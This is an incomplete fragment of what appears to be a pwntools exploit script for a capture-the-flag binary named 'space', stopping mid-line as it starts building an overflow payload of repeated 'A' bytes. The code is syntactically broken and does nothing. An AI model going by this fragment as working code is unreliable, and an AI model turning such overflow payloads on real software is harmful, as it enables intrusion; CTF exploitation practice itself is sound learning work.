from pwn import *

binary = context.binary = ELF('./space')

b = 
payload = b'A'*